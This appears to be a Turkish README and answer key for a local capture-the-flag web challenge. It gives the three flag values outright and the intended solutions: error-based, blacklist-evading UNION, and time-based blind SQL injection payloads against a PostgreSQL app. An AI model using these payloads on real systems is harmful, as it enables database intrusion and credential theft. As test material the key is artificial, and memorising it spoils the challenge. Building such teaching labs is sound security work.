# Projeyi ayağa kaldırır (İlk kurulumda kullanılır)
docker compose up --build

# Projeyi arka planda (daemon) çalıştırır
docker compose up -d

Sistem ayağa kalktıktan sonra tarayıcınızdan http://localhost:3000
adresine giderek soruya ulaşabilirsiniz.

Sorumuzda 3 flag olucak.

1. flag)
Login kısmından ulaşılacak.
SKYDAYS{y3t3r_4rt1k_sqld3n_b1kt1m}


2. flag)
Gizli şarkı sızdırılacak sonra wav dosyasından spectogram çözülcek.
SKYDAYS{fl4g_1sm1_bul4m1y0rum}



3. flag)
Flag tablosununflag kolonunda saklı
SKYDAYS{3_h4rfl1l3r_s0rusu_0ldu}



Soru Acıklaması:

Görevler:
1. Görev: Admin'in passwordunu bulunuz.
2. Görev: SKYDAYS ekibinin daha yayınlanmamış şarkısını sızdırın.
3. Görev: Sistem tablolarındaki gizli flagi bulunuz.


Soru çözümü:

1. flag için login pageden error based sql injection açığı kullanılacak.
Payload:
admin' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) -- 

2. flag için homepagede search kısmından is_released = FALSE olan şarkıları göstermemiz gerek. Ancak search kısmında blacklist koruması var boşluklar ve bazı kelimelere izin verilmiyor.
Ayrıca is_released kolonu keşfedilecek.
Payloadlar:

abc%')/**/uNiOn/**/seLeCt/**/NULL,column_name,NULL,NULL/**/fRoM/**/infOrmation_schema.columns/**/wHeRe/**/table_name='songs'--

abc%')/**/oR/**/is_released/**/=/**/FALSE--

Buradan sızdırılan wav kaydını buluyoruz. Daha sonra bu kaydı online spectografi decode toollarına atarak flagi buluyoruz.

Örnek spectogram sitesi : https://www.boxentriq.com/steganography/audio-spectrogram

3. flag için

flag tablosundaki flag kolonunu okumalıyız.

Song upload kısmındaki isim sorgulama yerine time-based sql injection saldırısı yapacagız.

Payload:
' AND (SELECT 'a' FROM pg_sleep(5) WHERE (SELECT substring(flag,1,1) FROM flag LIMIT 1)='S')='a


Burp Suite kullanılarak flag çekilecek.
--------------------------------
Her input sanitize edilmiştir mesela login pageden flag tablosuna erişim kısıtlanmıştır bu yüzden yarısmacılar 3. flag için time-based sql kullanması gerekir
